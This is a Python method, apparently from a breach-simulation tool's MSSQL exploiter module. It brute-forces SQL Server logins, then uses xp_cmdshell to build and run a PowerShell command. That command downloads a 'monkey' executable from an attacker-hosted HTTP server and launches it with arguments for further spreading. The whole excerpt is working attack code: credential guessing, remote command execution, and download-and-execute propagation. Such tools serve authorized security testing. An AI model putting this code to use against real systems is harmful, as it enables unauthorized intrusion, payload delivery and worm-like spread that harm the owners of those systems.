    def exploit_host(self):
        # Brute force to get connection
        username_passwords_pairs_list = self._config.get_exploit_user_password_pairs()
        cursor = self.brute_force(self.host.ip_addr, self.SQL_DEFAULT_TCP_PORT, username_passwords_pairs_list)

        if not cursor:
            LOG.error("Bruteforce process failed on host: {0}".format(self.host.ip_addr))
            return False

        # Get monkey exe for host and it's path
        src_path = tools.get_target_monkey(self.host)
        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(self.host, src_path)
        if not http_path:
            LOG.debug("Exploiter failed, http transfer creation failed.")
            return False
        LOG.info("Started http server on %s", http_path)

        dst_path = get_monkey_dest_path(http_path)
        tmp_file_path = os.path.join(get_monkey_dir_path(), MSSQLExploiter.TMP_FILE_NAME)

        # Create monkey dir.
        commands = ["xp_cmdshell \"mkdir %s\"" % get_monkey_dir_path()]
        MSSQLExploiter.execute_command(cursor, commands)

        # Form download command in a file
        commands = [
            "xp_cmdshell \"<nul set /p=powershell (new-object System.Net.WebClient).DownloadFile>%s\"" % tmp_file_path,
            "xp_cmdshell \"<nul set /p=(^\'%s^\' >>%s\"" % (http_path, tmp_file_path),
            "xp_cmdshell \"<nul set /p=, ^\'%s^\') >>%s\"" % (dst_path, tmp_file_path)]
        MSSQLExploiter.execute_command(cursor, commands)
        MSSQLExploiter.run_file(cursor, tmp_file_path)

        # Form monkey's command in a file
        monkey_args = tools.build_monkey_commandline(self.host,
                                                     tools.get_monkey_depth() - 1,
                                                     dst_path)
        monkey_args = ["xp_cmdshell \"<nul set /p=%s >>%s\"" % (part, tmp_file_path)
                       for part in textwrap.wrap(monkey_args, 40)]
        commands = ["xp_cmdshell \"<nul set /p=%s %s >%s\"" % (dst_path, DROPPER_ARG, tmp_file_path)]
        commands.extend(monkey_args)
        MSSQLExploiter.execute_command(cursor, commands)
        MSSQLExploiter.run_file(cursor, tmp_file_path)

        return True